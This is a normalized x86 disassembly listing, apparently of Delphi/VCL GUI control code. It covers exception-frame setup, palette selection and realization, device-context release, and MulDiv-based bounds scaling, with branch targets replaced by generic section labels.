mov ebx eax
xor eax eax
push ebp
push sub_447b09
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4185a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418b28
retn
call sub_4478f0
sub_447b2c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_425300
mov edx ebx
mov eax [ rw-data ]
call sub_418ad8
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_447b78
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_449628
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_447ba4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_447be0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418df8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_447c28
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_447ce4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_447db1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447db8
lea eax [ ebp - 0x1c ]
call sub_403eb8
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403324
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_458f18
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f48
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403f0c
sub_447dd4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_447e3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_455920
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_448fac
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x64 ]
pop eax
call sub_4042c4
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e42
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov al 0x1
sub_447e48
push ebx
mov ebx eax
mov eax ebx
call sub_455948
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_447e7c
push ebx
mov ebx eax
mov eax ebx
call sub_455998
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4042c4
je r-xdata
mov al 0x1
pop ebx
retn
sub_447eb4
push ebx
mov ebx eax
mov eax ebx
call sub_4559d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_447ee8
push ebx
mov ebx eax
mov eax ebx
call sub_42163c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_447f10
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_448fdc
sub_447f30
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_447f50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403f0c
sub_447f74
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_448ecc
sub_447f94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_447fc0
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4042c4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_448024
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_448900
sub_448044
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4488ec
sub_448064
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_448084
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_420d38
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424098
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44905c
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ba4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_449f58
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_44815c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4034f4
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_468400
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
push edi
xor ecx ecx
mov edx 0xb039
call sub_44a198
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_44894c
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403324
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403128
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403128
mov eax [ edi + 0x68 ]
call sub_403128
mov eax [ edi + 0x64 ]
call sub_408ab8
mov edx ebx
and dl 0xfc
mov eax edi
call sub_420d84
test bl bl
jle r-xdata
sub_448228
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_448250
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403324
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4482d8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_4485d8
sub_4482f8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403128
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44afb4
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403324
mov edx ebx
mov eax edi
call sub_420e08
mov eax ebx
mov si 0xffd9
call sub_403324
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_4483c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_421198
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_44a198
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44a198
sub_448454
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421054
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_448f64
jmp r-xdata
xor edx edx
mov eax esi
call sub_4482f8
sub_448498
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403324
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_4482d8
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403324
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_448540
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_44a728
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4493f4
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4485d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_44a198
mov eax ebx
mov si 0xffd0
call sub_403324
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403324
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_4485d8
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_4486f4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_448718
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_448740
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_448764
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_448788
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_448883
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403324
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44888a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41889c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403324
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403324
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_4185a4
sub_448894
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4493f4
mov edx edi
mov eax ebx
call sub_44896c
mov edx edi
mov eax ebx
call sub_44a23c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_448900
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403f0c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_448924
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_44894c
mov ecx esp
mov edx esi
mov eax ebx
mov si 0xffcc
call sub_403324
add esp 0x10
pop esi
pop ebx
retn
sub_44896c
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4489c8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4489f4
mov edx eax
mov ecx esp
mov eax esi
call sub_417088
mov edx esp
mov eax ebx
call sub_448e38
pop ecx
pop edx
pop esi
pop ebx
retn
sub_448a0c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4489b0
mov ecx esp
mov edx esi
call sub_417088
mov edx esp
mov eax ebx
call sub_448e38
pop ecx
pop edx
pop esi
pop ebx
retn
sub_448a34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448ab5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448abc
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
call sub_4038f4
sub_448ac4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448af0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_448b1c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4648b0
sub_448b4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44a198
sub_448bc8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
